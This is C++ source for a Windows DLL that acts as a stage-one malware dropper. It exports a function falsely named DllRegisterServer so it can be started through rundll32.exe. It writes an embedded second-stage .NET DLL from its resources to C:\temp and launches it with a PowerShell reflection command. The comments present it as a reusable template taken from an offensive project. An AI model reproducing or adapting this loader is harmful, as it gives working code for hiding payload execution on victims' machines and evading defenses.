#include "resource.h"
#include "pch.h"
#include <windows.h>
#include <stdio.h>
#include <string>
#include <stdlib.h>
#include <iostream>
#include <fstream>
#include <sys/stat.h>
#include <iostream>

//This DLL can be called with rundll32.exe. This example was pulled from a project in which this file contained a stage2 DLL file.
//The stage2 for this file is a .NET that is called by system.reflection.assembly

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

HMODULE GetCurrentModule()
{ // Need this for dll files, if compiling as a exe you don't need this and can set the values in myFunc to null
    HMODULE hModule = NULL;
    GetModuleHandleEx(
        GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS,
        (LPCTSTR)GetCurrentModule,
        &hModule);
    return hModule;
}

//call via rundll.  rundll32.exe ./thisdll.dll,DllRegisterServer
using namespace std;
extern "C" __declspec(dllexport) void CALLBACK DllRegisterServer(HWND, HINSTANCE, LPSTR, int)
{
    const string name = "C:\\temp\\stage2.dll"; // change this to where you want to output stage2.dll
    const string call = "[namespace.Class]::Main()"; // Change this to match what you set in the stage2.cs dll. Format: [Namespace.Class]::FunctiontoCall()
    HMODULE test = GetCurrentModule(); //need for dll compiling
    HRSRC myResource = ::FindResource(test, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
    unsigned int myResourceSize = ::SizeofResource(test, myResource);
    HGLOBAL myResourceData = ::LoadResource(test, myResource);
    void* pMyExecutable = ::LockResource(myResourceData);

    //Check if stage2 file exists, if it does not then create it.
    struct stat buffer;
    if (!(stat(name.c_str(), &buffer) == 0)) { 
        std::ofstream f(name, std::ios::out | std::ios::binary);
        f.write((char*)pMyExecutable, myResourceSize);
        f.close();
    }
    string output = "powershell $assembly = [System.Reflection.Assembly]::loadfile(\'" + name + "\');" + call; //loads the stage2 dll and executes
    system(output.c_str());
    
    __declspec(dllimport) void Main(void);
}
